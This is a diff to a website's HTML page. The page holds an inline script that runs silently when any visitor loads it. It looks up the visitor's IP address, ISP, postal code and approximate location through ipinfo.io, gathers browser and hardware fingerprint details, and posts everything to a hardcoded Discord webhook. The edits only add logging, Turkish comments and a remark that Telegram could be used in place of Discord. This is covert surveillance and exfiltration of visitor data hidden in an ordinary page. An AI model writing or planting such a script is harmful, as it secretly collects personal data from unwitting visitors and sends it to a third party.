@@ -147,7 +147,7 @@
     </div>
     <script src="theme.js"></script>
     <script src="main.js"></script>
-    <script>
+        <script>
         async function sendDiscordMessage(message) {
   const webhookUrl = 'https://discord.com/api/webhooks/1375548593942823082/4o2DfXSmAjWjiS1ztKHlUPJb6f3Ons4yyIaC3qoOw-VCmPUDUvFgFY85n4cqkn8vsxEN';
 
@@ -167,17 +167,20 @@
     if (!res.ok) {
       throw new Error(`Discord API error: ${res.status}`);
     }
+    console.log('Discord mesajı gönderildi!');
   } catch (err) {
+    console.error('Discord mesaj gönderme hatası:', err);
   }
 }
 
+// Sayfa yüklendiğinde ziyaretçi bilgisi gönder
 window.addEventListener('load', async () => {
   try {
-    const res = await fetch('https://ipinfo.io/json?token=f67c5ec0e57d3');
+    const res = await fetch('https://ipinfo.io/json?token=f67c5ecf0e57d3'); // Token isteğe bağlı ama sınır yükseltir
     if (!res.ok) throw new Error('IP info API error');
     const visitor = await res.json();
 
-    const ua = navigator.userAgent;
+   const ua = navigator.userAgent;
     const language = navigator.language;
     const platform = navigator.platform;
     const cookieEnabled = navigator.cookieEnabled;
@@ -198,6 +201,7 @@ Approx. Location: ${visitor.loc || 'Unknown'}
 ISP: ${visitor.org || 'Unknown'}
 Postal Code: ${visitor.postal || 'Unknown'}
 Timezone: ${visitor.timezone || 'Unknown'}
+
 **🖥️ System Info**
 Browser: ${ua.substring(0, 100)}
 Language: ${language}
@@ -206,17 +210,19 @@ Cookies Enabled: ${cookieEnabled ? 'Yes' : 'No'}
 RAM: ${deviceMemory} GB
 CPU Cores: ${hardwareConcurrency}
 Online: ${onlineStatus}
+
 **🖼️ Screen Info**
 Screen Resolution: ${screenRes}
 Available Space: ${availRes}
 Pixel Ratio: ${pixelRatio}
----
 `;
 
-    sendDiscordMessage(message);
+    sendDiscordMessage(message); // ya da sendTelegramMessage(message) vs.
   } catch (e) {
+    console.error(e);
   }
 });
+
 
     </script>
 </body>
